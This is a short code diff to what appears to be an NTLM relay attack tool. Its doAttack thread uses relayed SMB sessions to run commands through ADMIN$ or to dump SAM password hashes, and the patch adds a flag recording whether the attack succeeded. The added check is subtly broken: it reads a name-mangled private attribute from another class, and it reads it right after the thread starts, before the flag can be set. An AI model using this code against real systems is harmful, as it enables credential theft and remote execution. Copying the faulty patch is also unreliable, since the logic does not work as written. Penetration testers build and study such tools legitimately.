@@ -70,6 +70,7 @@ class doAttack(Thread):
 
         self.__exeFile = exeFile
         self.__command = command
+        self.__success = False
         self.__answerTMP = ''
         if exeFile is not None:
             self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
@@ -109,6 +110,7 @@ class doAttack(Thread):
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                     print self.__answerTMP
                     self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
+                    self.__success = True
                 else:
                     bootKey = remoteOps.getBootKey()
                     remoteOps._RemoteOperations__serviceDeleted = True
@@ -116,6 +118,7 @@ class doAttack(Thread):
                     samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                     samHashes.dump()
                     logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                    self.__success = True
             except Exception, e:
                 logging.error(str(e))
             finally:
@@ -526,7 +529,9 @@ class HTTPRelayServer(Thread):
                     clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
                     clientThread.start()
                     # Target attacked already, adding to the attacked set
-                    self.server.attacked.add(self.target)
+                    # check to see if attack succeeded before adding to attacked set
+                    if clientThread.__success:
+                        self.server.attacked.add(self.target)
                     # And answer 404 not found
                     self.send_response(404)
                     self.send_header('WWW-Authenticate', 'NTLM')
